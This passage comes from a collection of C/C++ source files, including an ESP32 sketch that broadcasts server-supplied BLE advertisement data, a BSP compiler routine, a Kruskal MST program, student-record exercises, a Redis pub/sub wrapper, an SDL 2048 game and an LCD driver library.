delay(1000);\r\n}\r\n\r\n\r\nvoid loop() {\r\n\r\n  HTTPClient http;\r\n  http.begin(\"http://\u670d\u52a1\u5668ip:3000/rawData\");//\u5728\u8fd9\u586b\u5165\u670d\u52a1\u5668api\r\n  \r\n  LCD_Clear(BLACK);\r\n  Paint_DrawString_EN(20, 50, \"Sending HTTP GET...\", &Font20, BLACK, GREEN);\r\n  delay(500);\r\n  \r\n  int httpCode = http.GET();\r\n\r\n  if (httpCode > 0) {\r\n    if (httpCode == HTTP_CODE_OK) {\r\n      String payload = http.getString();\r\n      \r\n      StaticJsonDocument<200> doc;\r\n      DeserializationError error = deserializeJson(doc, payload);\r\n      LCD_Clear(BLACK);  \r\n      Paint_DrawString_EN(20, 50, \"Data received!\", &Font20, BLACK, GREEN);\r\n      delay(1000);\r\n      \r\n      if (error) {\r\n        Serial.print(F(\"deserializeJson() failed: \"));\r\n        LCD_Clear(BLACK);\r\n        Paint_DrawString_EN(20, 50, \"JSON parsing error!\", &Font20, BLACK, RED);\r\n        Serial.println(error.f_str());\r\n        return;\r\n      }\r\n      \r\n      String rawDataStr = doc[\"rawData\"];\r\n      int rawDataLen = rawDataStr.length() / 2;\r\n      \r\n      LCD_Clear(BLACK);\r\n      Paint_DrawString_EN(20, 50, \"Parsing BLE data...\", &Font20, BLACK, GREEN);\r\n      delay(500);\r\n      \r\n      for (int i = 0; i < rawDataLen; i++) {\r\n        String byteString = rawDataStr.substring(i * 2, i * 2 + 2);\r\n        if (i < 31) {\r\n          bleRaw[i] = strtol(byteString.c_str(), NULL, 16);\r\n        } else {\r\n          bleRaw32[i - 31] = strtol(byteString.c_str(), NULL, 16);\r\n        }\r\n      }\r\n      \r\n      if (rawDataLen > 31) {\r\n        rawMoreThan31 = true;\r\n      }\r\n    }\r\n  } else {\r\n    Serial.printf(\"[HTTP] GET... failed, error: %s\\n\", http.errorToString(httpCode).c_str());\r\n    LCD_Clear(BLACK);\r\n    Paint_DrawString_EN(20, 50, \"HTTP GET failed!\", &Font20, BLACK, RED);\r\n    delay(1000);\r\n  }\r\n  \r\n  http.end();\r\n\r\n  if (UNIVERSAL_MAC_ADDR_NUM == FOUR_UNIVERSAL_MAC_ADDR) {\r\n    bleMac[5] -= 2;\r\n  } else if (UNIVERSAL_MAC_ADDR_NUM == TWO_UNIVERSAL_MAC_ADDR) {\r\n    bleMac[5] -= 1;\r\n  }\r\n  esp_base_mac_addr_set(bleMac);\r\n\r\n  BLEDevice::init(\"\");\r\n\r\n  pAdvertising = BLEDevice::getAdvertising();\r\n\r\n  BLEAdvertisementData oScanResponseData = BLEAdvertisementData();\r\n  pAdvertising->setScanResponseData(oScanResponseData);\r\n\r\n  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();\r\n  pAdvertising->setAdvertisementData(oAdvertisementData);\r\n  \r\n  LCD_Clear(BLACK);\r\n  Paint_DrawString_EN(20, 50, \"Configuring BLE...\", &Font20, BLACK, GREEN);\r\n  delay(500);\r\n\r\n  esp_err_t errRc = ::esp_ble_gap_config_adv_data_raw(bleRaw, 31);\r\n  if (errRc != ESP_OK) {\r\n    Serial.printf(\"esp_ble_gap_config_adv_data_raw: %d\\n\", errRc);\r\n    LCD_Clear(BLACK);\r\n    Paint_DrawString_EN(20, 50, \"BLE config error!\", &Font20, BLACK, RED);\r\n    delay(1000);\r\n  }\r\n\r\n  if (rawMoreThan31) {\r\n    errRc = ::esp_ble_gap_config_scan_rsp_data_raw(bleRaw32, sizeof(bleRaw32)/sizeof(bleRaw32[0]));\r\n    if (errRc != ESP_OK) {\r\n      Serial.printf(\"esp_ble_gap_config_scan_rsp_data_raw: %d\\n\", errRc);\r\n    }\r\n  }\r\n\r\n  pAdvertising->start();\r\n  LCD_Clear(BLACK);\r\n  Paint_DrawString_EN(20, 50, \"BLE advertising...\", &Font20, BLACK, GREEN);\r\n  delay(1000);\r\n  \r\n  LCD_Clear(BLACK);\r\n  Paint_DrawString_EN(20, 50, \"Execution completed!\", &Font20, BLACK, GREEN);\r\n  delay(5000);\r\n  LCD_Clear(BLACK);\r\n  delay(1000);\r\n\r\n}\r\n",
    "#include \"bsp5.h\"\n\ntypedef struct wvert_s {\n    vec_t t;\n    struct wvert_s *prev;\n    struct wvert_s *next;\n} wvert_t;\n\ntypedef struct wedge_s {\n    struct wedge_s *next;\n    vec3_t dir;\n    vec3_t origin;\n    wvert_t head;\n} wedge_t;\n\nstatic int numwedges;\nstatic int numwverts;\nstatic int tjuncs;\nstatic int tjuncfaces;\n\n#define MAX_WVERTS 0x40000\n#define MAX_WEDGES 0x20000\n\nstatic wvert_t wverts[MAX_WVERTS];\nstatic wedge_t wedges[MAX_WEDGES];\n\n//============================================================================\n\n#define NUM_HASH 1024\n\nwedge_t *wedge_hash[NUM_HASH];\n\nstatic vec3_t hash_min;\nstatic vec3_t hash_scale;\n\nstatic void InitHash(const vec3_t mins, const vec3_t maxs) {\n    vec3_t size;\n    vec_t volume;\n    vec_t scale;\n    int newsize[2];\n\n    VectorCopy(mins, hash_min);\n    VectorSubtract(maxs, mins, size);\n    memset(wedge_hash, 0, sizeof(wedge_hash));\n\n    volume = size[0] * size[1];\n\n    scale = sqrt(volume / NUM_HASH);\n\n    newsize[0] = size[0] / scale;\n    newsize[1] = size[1] / scale;\n\n    hash_scale[0] = newsize[0] / size[0];\n    hash_scale[1] = newsize[1] / size[1];\n    hash_scale[2] = newsize[1];\n}\n\nstatic unsigned HashVec(const vec3_t vec) {\n    unsigned h;\n\n    h = hash_scale[0] * (vec[0] - hash_min[0]) * hash_scale[2] + hash_scale[1] * (vec[1] - hash_min[1]);\n    if (h >= NUM_HASH) {\n        return NUM_HASH - 1;\n    }\n    return h;\n}\n\n//============================================================================\n\nstatic bool CanonicalVector(vec3_t vec) {\n    if (VectorNormalize(vec)) {\n        if (vec[0] > NORMAL_EPSILON) {\n            return true;\n        } else if (vec[0] < -NORMAL_EPSILON) {\n            VectorSubtract(vec3_origin, vec, vec);\n            return true;\n        } else {\n            vec[0] = 0;\n        }\n\n        if (vec[1] > NORMAL_EPSILON) {\n            return true;\n        } else if (vec[1] < -NORMAL_EPSILON) {\n            VectorSubtract(vec3_origin, vec, vec);\n            return true;\n        } else {\n            vec[1] = 0;\n        }\n\n        if (vec[2] > NORMAL_EPSILON) {\n            return true;\n        } else if (vec[2] < -NORMAL_EPSILON) {\n            VectorSubtract(vec3_origin, vec, vec);\n            return true;\n        } else {\n            vec[2] = 0;\n        }\n        //        hlassert(false);\n        return false;\n    }\n    //    hlassert(false);\n    return false;\n}\n\nstatic wedge_t *FindEdge(const vec3_t p1, const vec3_t p2, vec_t *t1, vec_t *t2) {\n    vec3_t origin;\n    vec3_t dir;\n    wedge_t *w;\n    vec_t temp;\n    int h;\n\n    VectorSubtract(p2, p1, dir);\n    if (!CanonicalVector(dir)) {\n#if _DEBUG\n        Warning(\"CanonicalVector: degenerate @ (%4.3f %4.3f %4.3f )\\n\", p1[0], p1[1], p1[2]);\n#endif\n    }\n\n    *t1 = DotProduct(p1, dir);\n    *t2 = DotProduct(p2, dir);\n\n    VectorMA(p1, -*t1, dir, origin);\n\n    if (*t1 > *t2) {\n        temp = *t1;\n        *t1 = *t2;\n        *t2 = temp;\n    }\n\n    h = HashVec(origin);\n\n    for (w = wedge_hash[h]; w; w = w->next) {\n        temp = w->origin[0] - origin[0];\n        if (temp < -EQUAL_EPSILON || temp > EQUAL_EPSILON) {\n            continue;\n        }\n        temp = w->origin[1] - origin[1];\n        if (temp < -EQUAL_EPSILON || temp > EQUAL_EPSILON) {\n            continue;\n        }\n        temp = w->origin[2] - origin[2];\n        if (temp < -EQUAL_EPSILON || temp > EQUAL_EPSILON) {\n            continue;\n        }\n\n        temp = w->dir[0] - dir[0];\n        if (temp < -EQUAL_EPSILON || temp > EQUAL_EPSILON) {\n            continue;\n        }\n        temp = w->dir[1] - dir[1];\n        if (temp < -EQUAL_EPSILON || temp > EQUAL_EPSILON) {\n            continue;\n        }\n        temp = w->dir[2] - dir[2];\n        if (temp < -EQUAL_EPSILON || temp > EQUAL_EPSILON) {\n            continue;\n        }\n\n        return w;\n    }\n\n    hlassume(numwedges < MAX_WEDGES, assume_MAX_WEDGES);\n    w = &wedges[numwedges];\n    numwedges++;\n\n    w->next = wedge_hash[h];\n    wedge_hash[h] = w;\n\n    VectorCopy(origin, w->origin);\n    VectorCopy(dir, w->dir);\n    w->head.next = w->head.prev = &w->head;\n    w->head.t = 99999;\n    return w;\n}\n\n/*\n * ===============\n * AddVert\n * \n * ===============\n */\n#define T_EPSILON ON_EPSILON\n\nstatic void AddVert(const wedge_t *const w, const vec_t t) {\n    wvert_t *v;\n    wvert_t *newv;\n\n    v = w->head.next;\n    do {\n        if (fabs(v->t - t) < T_EPSILON) {\n            return;\n        }\n        if (v->t > t) {\n            break;\n        }\n        v = v->next;\n    } while (1);\n\n    // insert a new wvert before v\n    hlassume(numwverts < MAX_WVERTS, assume_MAX_WVERTS);\n\n    newv = &wverts[numwverts];\n    numwverts++;\n\n    newv->t = t;\n    newv->next = v;\n    newv->prev = v->prev;\n    v->prev->next = newv;\n    v->prev = newv;\n}\n\n/*\n * ===============\n * AddEdge\n * ===============\n */\nstatic void AddEdge(const vec3_t p1, const vec3_t p2) {\n    wedge_t *w;\n    vec_t t1;\n    vec_t t2;\n\n    w = FindEdge(p1, p2, &t1, &t2);\n    AddVert(w, t1);\n    AddVert(w, t2);\n}\n\n/*\n * ===============\n * AddFaceE",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <algorithm>\n#include <string>\n\nusing namespace std;\n\nclass Arete {\npublic:\n    int src, dest, poids;\n\n    Arete(int src, int dest, int poids) {\n        this->src = src;\n        this->dest = dest;\n        this->poids = poids;\n    }\n};\n\nclass Graphe {\npublic:\n    int V, E;\n    vector<string> MST;\n    vector<Arete> aretes;\n\n    Graphe(int V, int E) {\n        this->V = V;\n        this->E = E;\n    }\n\n    void ajouterArete(int src, int dest, int poids) {\n        Arete arete(src, dest, poids);\n        aretes.push_back(arete);\n    }\n    \n    int trouver(vector<int>& parent, int i) {\n        if (parent[i] == -1)\n            return i;\n        return trouver(parent, parent[i]);\n    }\n    \n    void kruskalMST() {\n        vector<int> parent(V, -1);        \n        sort(aretes.begin(), aretes.end(), [](Arete a, Arete b) {\n            return a.poids < b.poids;\n            });\n\n        for (Arete arete : aretes) {\n            int x = trouver(parent, arete.src);\n            int y = trouver(parent, arete.dest);            \n            \n            if (x != y) {\n                cout << arete.src << \" - \" << arete.dest << \" : \" << arete.poids << endl;\n                MST.push_back( \"(\" + to_string(arete.src) + \", \" + to_string(arete.dest) + \", \" + to_string(arete.poids) + \"),\\n\");\n                parent[x] = y;\n            }\n        }\n    }\n\n    void exporter_Kruskal() {\n\n        ofstream outputFile(\"C:/Users/RENTO/Desktop/Recherche_Op\u00e9rationnelle/Kruskal_data.txt\");\n\n        if (outputFile.is_open()) {\n\n            outputFile << \"[\" << endl;\n            for (Arete arete : aretes) {\n                outputFile << \"(\" << arete.src << \", \" << arete.dest << \", \" << arete.poids << \"),\" << endl;\n            }\n            outputFile << \"]\" << endl;\n\n            outputFile.close();\n            cout << \"Exportation de Kruskal reussie\" << endl;\n        }\n        else {\n            cout << \"Echec d'acces au fichier\" << endl;\n        }\n    }\n\n    void exporter_Kruskal_MST() {\n\n        ofstream outputFile(\"C:/Users/RENTO/Desktop/Recherche_Op\u00e9rationnelle/Kruskal_MST.txt\");\n\n        if (outputFile.is_open()) {\n\n            outputFile << \"[\" << endl;\n            for (string var : MST)\n            {\n                outputFile << var;\n            }            \n            outputFile << \"]\" << endl;\n\n            outputFile.close();\n            cout << \"Exportation de Kruskal MST reussie\" << endl;\n        }\n        else {\n            cout << \"Echec d'acces au fichier\" << endl;\n        }\n    }\n};\n\n\nvoid Dessiner() {\n    string pythonScriptPath = \"C:/Users/RENTO/Desktop/Recherche_Op\u00e9rationnelle/Kruskal_Draw.py\";\n\n    string command = \"python \" + pythonScriptPath;\n\n    int result = system(command.c_str());\n\n    if (result == 0) {\n        cout << \"Les graphes ont ete dessines avec succes.\";\n    }\n    else {\n        cout << \"Erreur d'execution\";\n    }\n}\n\nint main() {\n    Graphe graphe(5, 5);\n    \n    graphe.ajouterArete(0, 1, 6);\n    graphe.ajouterArete(1, 2, 5);\n    graphe.ajouterArete(0, 2, 8);\n    graphe.ajouterArete(2, 3, 1);\n    graphe.ajouterArete(3, 4, 2);\n\n    graphe.exporter_Kruskal();\n\n    cout << \"Arbre couvrant minimal de Kruskal :\" << endl;\n    graphe.kruskalMST();\n    graphe.exporter_Kruskal_MST();\n    Dessiner();\n\n\n    /*\n    int nbrSommet, nbrArret;\n    cout << \"Entrez le nombre de sommets : \" << endl;\n    cin >> nbrSommet;\n    cout << \"Entrez le nombre d'arrets : \" << endl;\n    cin >> nbrArret;\n\n    Graphe graphe1(nbrSommet, nbrArret);\n    int dep, dest, poids;\n    for (int i = 0;i < nbrArret;i++) {\n        cout << \"Entrez le sommet de depart / destination / poids : \" << endl;\n        cin >> dep >> dest >> poids;\n        graphe1.ajouterArete(dep, dest, poids);\n    }\n    */\n\n    return 0;\n}",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct DetailAlamat {\n\tstring desa;\n\tstring kota;\n};\n\nstruct Mahasiswa {\n\tstring nim;\n\tstring nama;\n\tDetailAlamat alamat;\n\tint umur;\n};\n\nint main()\n{\n\tMahasiswa mhs[3];\n\tfor (int i = 0; i < 3; i++) {\n\t\tcout << \"Data ke-\" << (i + 1) << endl;\n\t\tcout << \"Nomor Mahasiswa : \";\n\t\tgetline(cin, mhs[i].nim);\n\t\tcout << \"Nama Mahasiswa : \";\n\t\tgetline(cin, mhs[i].nama);\n\n\t\tcout << \"Alamat Mahasiswa : \" << endl;\n\t\tcout << \"\\t Nama Desa : \";\n\t\tcin >> mhs[i].alamat.desa;\n\t\tcout << \"\\t Nama Kota : \";\n\t\tcin >> mhs[i].alamat.kota;\n\t\tcout << \"Umur Mahasiswa : \";\n\t\tcin >> mhs[i].umur;\n\t\tcin.ignore(1, '\\n');\n\t\tcout << endl;\n\t}\n\n\tfor (int i = 0; i < 3; i++) {\n\t\tcout << endl;\n\t\tcout << \"data Mahasiswa ke-\" << (i + 1) << endl;\n\t\tcout << \"\\n NIM : \" << mhs[i].nim;\n\t\tcout << \"\\n Nama : \" << mhs[i].nama;\n\t\tcout << \"\\n Alamat : \";\n\t\tcout << \"\\n \\t Desa : \" << mhs[i].alamat.desa;\n\t\tcout << \"\\n \\t Kota: \" << mhs[i].alamat.kota;\n\t\tcout << \"\\n Umur : \" << mhs[i].umur;\n\t\tcout << endl;\n\t}\n}",
    "#include <iostream>\nusing namespace std;\n\nstruct DetailAlamat\n{\n    string desa;\n    string kota;\n};\n\nstruct Mahasiswa \n{\n    string nim;\n    string nama;\n    DetailAlamat alamat; \n    int umur; \n};\n\nint main()\n{\n    Mahasiswa mhs[3];\n    for (int i=0;i<3;i++){\n        cout << \"Data ke-\" << (i+1)<<\":\"<<endl;\n        cout << \"Nomor Mahasiswa : \";\n        getline(cin, mhs[i].nim);\n        cout <<\"Nama Mahasiswa: \";\n        getline(cin,mhs[i].nama);\n\n        cout << \"Alamat Mahasiswa : \" <<endl;\n        cout << \"\\t Nama Desa: \";\n        cin >> mhs[i].alamat.desa;\n        cout << \"\\t Nama Kota: \";\n        cin >> mhs[i].alamat.kota;\n\n        cout << \"Umur Mahasiswa : \";\n        cin >> mhs[i].umur;\n        cin.ignore(1,'/n');\n        cout<<endl;\n    }\n    for (int i=0;i<3;i++){\n        cout << endl;\n        cout << \"Data mahasiswa ke-\" <<(i+1)<<\":\"<<endl;\n        cout <<\"\\n NIM: \"<<mhs[i].nim;\n        cout << \"\\n Nama: \"<< mhs[i].nama;\n        cout << \"\\n Alamat: \";\n        cout << \"\\n Desa: \"<< mhs[i].alamat.desa;\n        cout << \"\\n Kota: \"<< mhs[i].alamat.kota;\n        cout << \"\\n Umur: \"<< mhs[i].umur;\n        cout << endl;\n    }\n}",
    "#include \"redis.hpp\"\n\n#include <iostream>\nusing namespace std;\n\nRedis::Redis() : _publish_context(nullptr), _subcribe_context(nullptr) {}\n\nRedis::~Redis() {\n  if (_publish_context != nullptr) {\n    redisFree(_publish_context);\n  }\n\n  if (_subcribe_context != nullptr) {\n    redisFree(_subcribe_context);\n  }\n}\n\nbool Redis::connect() {\n  // \u8d1f\u8d23publish\u53d1\u5e03\u6d88\u606f\u7684\u4e0a\u4e0b\u6587\u8fde\u63a5\n  _publish_context = redisConnect(\"127.0.0.1\", 6379);\n  if (nullptr == _publish_context) {\n    cerr << \"connect redis failed!\" << endl;\n    return false;\n  }\n\n  // \u8d1f\u8d23subscribe\u8ba2\u9605\u6d88\u606f\u7684\u4e0a\u4e0b\u6587\u8fde\u63a5\n  _subcribe_context = redisConnect(\"127.0.0.1\", 6379);\n  if (nullptr == _subcribe_context) {\n    cerr << \"connect redis failed!\" << endl;\n    return false;\n  }\n\n  // \u5728\u5355\u72ec\u7684\u7ebf\u7a0b\u4e2d\uff0c\u76d1\u542c\u901a\u9053\u4e0a\u7684\u4e8b\u4ef6\uff0c\u6709\u6d88\u606f\u7ed9\u4e1a\u52a1\u5c42\u8fdb\u884c\u4e0a\u62a5\n  thread t([&]() { observer_channel_message(); });\n  t.detach();\n\n  cout << \"connect redis-server success!\" << endl;\n\n  return true;\n}\n\n// \u5411redis\u6307\u5b9a\u7684\u901a\u9053channel\u53d1\u5e03\u6d88\u606f\nbool Redis::publish(int channel, string message) {\n  redisReply *reply = (redisReply *)redisCommand(\n      _publish_context, \"PUBLISH %d %s\", channel, message.c_str());\n  if (nullptr == reply) {\n    cerr << \"publish command failed!\" << endl;\n    return false;\n  }\n  freeReplyObject(reply);\n  return true;\n}\n\n// \u5411redis\u6307\u5b9a\u7684\u901a\u9053subscribe\u8ba2\u9605\u6d88\u606f\nbool Redis::subscribe(int channel) {\n  // SUBSCRIBE\u547d\u4ee4\u672c\u8eab\u4f1a\u9020\u6210\u7ebf\u7a0b\u963b\u585e\u7b49\u5f85\u901a\u9053\u91cc\u9762\u53d1\u751f\u6d88\u606f\uff0c\u8fd9\u91cc\u53ea\u505a\u8ba2\u9605\u901a\u9053\uff0c\u4e0d\u63a5\u6536\u901a\u9053\u6d88\u606f\n  // \u901a\u9053\u6d88\u606f\u7684\u63a5\u6536\u4e13\u95e8\u5728observer_channel_message\u51fd\u6570\u4e2d\u7684\u72ec\u7acb\u7ebf\u7a0b\u4e2d\u8fdb\u884c\n  // \u53ea\u8d1f\u8d23\u53d1\u9001\u547d\u4ee4\uff0c\u4e0d\u963b\u585e\u63a5\u6536redis\n  // server\u54cd\u5e94\u6d88\u606f\uff0c\u5426\u5219\u548cnotifyMsg\u7ebf\u7a0b\u62a2\u5360\u54cd\u5e94\u8d44\u6e90\n  if (REDIS_ERR ==\n      redisAppendCommand(this->_subcribe_context, \"SUBSCRIBE %d\", channel)) {\n    cerr << \"subscribe command failed!\" << endl;\n    return false;\n  }\n  // redisBufferWrite\u53ef\u4ee5\u5faa\u73af\u53d1\u9001\u7f13\u51b2\u533a\uff0c\u76f4\u5230\u7f13\u51b2\u533a\u6570\u636e\u53d1\u9001\u5b8c\u6bd5\uff08done\u88ab\u7f6e\u4e3a1\uff09\n  int done = 0;\n  while (!done) {\n    if (REDIS_ERR == redisBufferWrite(this->_subcribe_context, &done)) {\n      cerr << \"subscribe command failed!\" << endl;\n      return false;\n    }\n  }\n  // redisGetReply\n\n  return true;\n}\n\n// \u5411redis\u6307\u5b9a\u7684\u901a\u9053unsubscribe\u53d6\u6d88\u8ba2\u9605\u6d88\u606f\nbool Redis::unsubscribe(int channel) {\n  if (REDIS_ERR ==\n      redisAppendCommand(this->_subcribe_context, \"UNSUBSCRIBE %d\", channel)) {\n    cerr << \"unsubscribe command failed!\" << endl;\n    return false;\n  }\n  // redisBufferWrite\u53ef\u4ee5\u5faa\u73af\u53d1\u9001\u7f13\u51b2\u533a\uff0c\u76f4\u5230\u7f13\u51b2\u533a\u6570\u636e\u53d1\u9001\u5b8c\u6bd5\uff08done\u88ab\u7f6e\u4e3a1\uff09\n  int done = 0;\n  while (!done) {\n    if (REDIS_ERR == redisBufferWrite(this->_subcribe_context, &done)) {\n      cerr << \"unsubscribe command failed!\" << endl;\n      return false;\n    }\n  }\n  return true;\n}\n\n// \u5728\u72ec\u7acb\u7ebf\u7a0b\u4e2d\u63a5\u6536\u8ba2\u9605\u901a\u9053\u4e2d\u7684\u6d88\u606f\nvoid Redis::observer_channel_message() {\n  redisReply *reply = nullptr;\n  while (REDIS_OK == redisGetReply(this->_subcribe_context, (void **)&reply)) {\n    // \u8ba2\u9605\u6536\u5230\u7684\u6d88\u606f\u662f\u4e00\u4e2a\u5e26\u4e09\u5143\u7d20\u7684\u6570\u7ec4\n    if (reply != nullptr && reply->element[2] != nullptr &&\n        reply->element[2]->str != nullptr) {\n      // \u7ed9\u4e1a\u52a1\u5c42\u4e0a\u62a5\u901a\u9053\u4e0a\u53d1\u751f\u7684\u6d88\u606f\n      _notify_message_handler(atoi(reply->element[1]->str),\n                              reply->element[2]->str);\n    }\n\n    freeReplyObject(reply);\n  }\n\n  cerr << \">>>>>>>>>>>>> observer_channel_message quit <<<<<<<<<<<<<\" << endl;\n}\n\nvoid Redis::init_notify_handler(function<void(int, string)> fn) {\n  this->_notify_message_handler = fn;\n}",
    "#include<bits/stdc++.h>\r\n#include<SDL2/SDL.h>\r\n#include<SDL2/SDL_image.h>\r\n#include<SDL2/SDL_ttf.h>\r\n\r\n#include\"class.h\"\r\n#include\"board.h\"\r\n#include\"useForAll.h\"\r\n#include\"loseAndWin.h\"\r\n#include\"newGameButton.h\"\r\n#include\"score.h\"\r\n\r\nusing namespace std; \r\n\r\n\r\nvoid start()\r\n{\r\n    setUpBoard();\r\n\r\n    block0.val = 0;\r\n    block0.update();\r\n\r\n    generate();\r\n    drawBoard();\r\n    updateBoard();\r\n\r\n    SDL_Event e;\r\n    bool quit = 0;\r\n    while(!quit)\r\n    {\r\n        while(SDL_PollEvent(&e))\r\n        {\r\n            if(e.type == SDL_QUIT) \r\n            {\r\n                quit = 1;\r\n                lBest.save();\r\n            }\r\n            checkLose();\r\n            blockMovement(e);\r\n            newButton.event(e);\r\n        }\r\n\r\n        if(restart) makeNewGame();\r\n        drawBoard();\r\n        updateBoard();\r\n\r\n        if(!lose) SDL_RenderPresent(gRenderer);\r\n        else printLoseScreen(); \r\n    }\r\n}\r\n\r\n\r\nvoid init()\r\n{\r\n    if(SDL_Init(SDL_INIT_EVERYTHING)) cout << \"fail\";\r\n    gWindow = SDL_CreateWindow(\"2048\", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, \r\n                                WINDOW_WIDTH, WINDOW_HEIGHT, SDL_WINDOW_SHOWN);\r\n    \r\n    gRenderer = SDL_CreateRenderer(gWindow, -1, SDL_RENDERER_ACCELERATED|SDL_RENDERER_PRESENTVSYNC);\r\n    IMG_Init(IMG_INIT_PNG);\r\n    TTF_Init();\r\n}\r\n\r\n\r\nvoid close()\r\n{\r\n    SDL_Quit();\r\n    IMG_Quit();\r\n    TTF_Quit();\r\n}\r\n\r\n\r\nvoid loadMedia()\r\n{\r\n    SDL_Surface* tmpSurface = NULL;\r\n    for(int i = 0; i <= 10; i++)\r\n    {\r\n        stringstream s(\"\");\r\n        s << \"images/\" << (1 << i) << \".png\";\r\n        tmpSurface = IMG_Load(s.str().c_str());\r\n\r\n        value[i] = SDL_CreateTextureFromSurface(gRenderer, tmpSurface);\r\n    }\r\n\r\n    tmpSurface = IMG_Load(\"images/background.png\");\r\n    background = SDL_CreateTextureFromSurface(gRenderer, tmpSurface);\r\n\r\n    SDL_FreeSurface(tmpSurface);\r\n\r\n\r\n    loadLoseAndWinScreen();\r\n    newButton.imgLoad();\r\n    lBest.imgLoad(\"images/best.png\");\r\n    lScore.imgLoad(\"images/score.png\");\r\n\r\n\r\n    font = TTF_OpenFont(\"images/font1.ttf\", 35);\r\n\r\n    ifstream getBestScore(\"images/scoreSave.txt\");\r\n    getBestScore >> best;\r\n    getBestScore.close();\r\n}\r\n\r\n\r\nint main(int argv, char* argc[])\r\n{\r\n    srand(time(0));\r\n    init();\r\n    loadMedia();\r\n\r\n    start();\r\n    close();\r\n\r\n    return 0;\r\n}",
    "#include \"LiquidCrystal_I2C.h\"\r\n#include <inttypes.h>\r\n#if defined(ARDUINO) && ARDUINO >= 100\r\n\r\n#include \"Arduino.h\"\r\n\r\n#define printIIC(args)\tWire.write(args)\r\ninline size_t LiquidCrystal_I2C::write(uint8_t value) {\r\n\tsend(value, Rs);\r\n\treturn 1;\r\n}\r\n\r\n#else\r\n#include \"WProgram.h\"\r\n\r\n#define printIIC(args)\tWire.send(args)\r\ninline void LiquidCrystal_I2C::write(uint8_t value) {\r\n\tsend(value, Rs);\r\n}\r\n\r\n#endif\r\n#include \"Wire.h\"\r\n\r\n\r\n\r\n// When the display powers up, it is configured as follows:\r\n//\r\n// 1. Display clear\r\n// 2. Function set: \r\n//    DL = 1; 8-bit interface data \r\n//    N = 0; 1-line display \r\n//    F = 0; 5x8 dot character font \r\n// 3. Display on/off control: \r\n//    D = 0; Display off \r\n//    C = 0; Cursor off \r\n//    B = 0; Blinking off \r\n// 4. Entry mode set: \r\n//    I/D = 1; Increment by 1\r\n//    S = 0; No shift \r\n//\r\n// Note, however, that resetting the Arduino doesn't reset the LCD, so we\r\n// can't assume that its in that state when a sketch starts (and the\r\n// LiquidCrystal constructor is called).\r\n\r\nLiquidCrystal_I2C::LiquidCrystal_I2C(uint8_t lcd_Addr,uint8_t lcd_cols,uint8_t lcd_rows)\r\n{\r\n  _Addr = lcd_Addr;\r\n  _cols = lcd_cols;\r\n  _rows = lcd_rows;\r\n  _backlightval = LCD_NOBACKLIGHT;\r\n}\r\n\r\nvoid LiquidCrystal_I2C::init(){\r\n\tinit_priv();\r\n}\r\n\r\nvoid LiquidCrystal_I2C::init_priv()\r\n{\r\n\tWire.begin();\r\n\t_displayfunction = LCD_4BITMODE | LCD_1LINE | LCD_5x8DOTS;\r\n\tbegin(_cols, _rows);  \r\n}\r\n\r\nvoid LiquidCrystal_I2C::begin(uint8_t cols, uint8_t lines, uint8_t dotsize) {\r\n\tif (lines > 1) {\r\n\t\t_displayfunction |= LCD_2LINE;\r\n\t}\r\n\t_numlines = lines;\r\n\r\n\t// for some 1 line displays you can select a 10 pixel high font\r\n\tif ((dotsize != 0) && (lines == 1)) {\r\n\t\t_displayfunction |= LCD_5x10DOTS;\r\n\t}\r\n\r\n\t// SEE PAGE 45/46 FOR INITIALIZATION SPECIFICATION!\r\n\t// according to datasheet, we need at least 40ms after power rises above 2.7V\r\n\t// before sending commands. Arduino can turn on way befer 4.5V so we'll wait 50\r\n\tdelay(50); \r\n  \r\n\t// Now we pull both RS and R/W low to begin commands\r\n\texpanderWrite(_backlightval);\t// reset expanderand turn backlight off (Bit 8 =1)\r\n\tdelay(1000);\r\n\r\n  \t//put the LCD into 4 bit mode\r\n\t// this is according to the hitachi HD44780 datasheet\r\n\t// figure 24, pg 46\r\n\t\r\n\t  // we start in 8bit mode, try to set 4 bit mode\r\n   write4bits(0x03 << 4);\r\n   delayMicroseconds(4500); // wait min 4.1ms\r\n   \r\n   // second try\r\n   write4bits(0x03 << 4);\r\n   delayMicroseconds(4500); // wait min 4.1ms\r\n   \r\n   // third go!\r\n   write4bits(0x03 << 4); \r\n   delayMicroseconds(150);\r\n   \r\n   // finally, set to 4-bit interface\r\n   write4bits(0x02 << 4); \r\n\r\n\r\n\t// set # lines, font size, etc.\r\n\tcommand(LCD_FUNCTIONSET | _displayfunction);  \r\n\t\r\n\t// turn the display on with no cursor or blinking default\r\n\t_displaycontrol = LCD_DISPLAYON | LCD_CURSOROFF | LCD_BLINKOFF;\r\n\tdisplay();\r\n\t\r\n\t// clear it off\r\n\tclear();\r\n\t\r\n\t// Initialize to default text direction (for roman languages)\r\n\t_displaymode = LCD_ENTRYLEFT | LCD_ENTRYSHIFTDECREMENT;\r\n\t\r\n\t// set the entry mode\r\n\tcommand(LCD_ENTRYMODESET | _displaymode);\r\n\t\r\n\thome();\r\n  \r\n}\r\n\r\n/********** high level commands, for the user! */\r\nvoid LiquidCrystal_I2C::clear(){\r\n\tcommand(LCD_CLEARDISPLAY);// clear display, set cursor position to zero\r\n\tdelayMicroseconds(2000);  // this command takes a long time!\r\n}\r\n\r\nvoid LiquidCrystal_I2C::home(){\r\n\tcommand(LCD_RETURNHOME);  // set cursor position to zero\r\n\tdelayMicroseconds(2000);  // this command takes a long time!\r\n}\r\n\r\nvoid LiquidCrystal_I2C::setCursor(uint8_t col, uint8_t row){\r\n\tint row_offsets[] = { 0x00, 0x40, 0x14, 0x54 };\r\n\tif ( row > (_numlines-1) ) {\r\n\t\trow = _numlines-1;    // we count rows starting w/0\r\n\t}\r\n\tcommand(LCD_SETDDRAMADDR | (col + row_offsets[row]));\r\n}\r\n\r\n// Turn the display on/off (quickly)\r\nvoid LiquidCrystal_I2C::noDisplay() {\r\n\t_displaycontrol &= ~LCD_DISPLAYON;\r\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\r\n}\r\nvoid LiquidCrystal_I2C::display() {\r\n\t_displaycontrol |= LCD_DISPLAYON;\r\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\r\n}\r\n\r\n// Turns the underline cursor on/off\r\nvoid LiquidCrystal_I2C::noCursor() {\r\n\t_displaycontrol &= ~LCD_CURSORON;\r\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\r\n}\r\nvoid 